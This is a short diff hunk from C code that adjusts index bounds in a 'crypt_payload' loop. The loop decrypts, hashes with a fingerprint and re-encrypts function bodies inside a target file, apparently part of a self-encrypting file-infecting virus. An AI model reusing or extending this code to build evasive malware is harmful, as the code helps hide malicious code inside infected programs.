@@ -164,13 +164,13 @@ void		crypt_payload(t_info *info, uint32_t fingerprint)
 	// decrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], x);
 	// reencrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], key);
 
-	while (i <= 29)
+	while (i <= 31)
 	{
-		if (i != 20 && i != 21 && i != 22 && i != 23 && i != 29)
+		if (i != 22 && i != 23 && i != 24 && i != 25 && i != 31)
 		{
 			size = info->tab_addr[i + 1] - info->tab_addr[i];
 			offset = info->tab_addr[i] - (size_t)(&ft_memcpy);
-			if (i != 26 && i != 28)
+			if (i != 28 && i != 30)
 				decrypt_func(info, info->file + info->offset_bis + BIS_SIZE + offset, size, i);
 			hash = hash_func((void *)(info->tab_addr[i]), size, fingerprint);
 			hash = encrypt_func(info->file + info->offset_bis + BIS_SIZE + offset, size, hash);
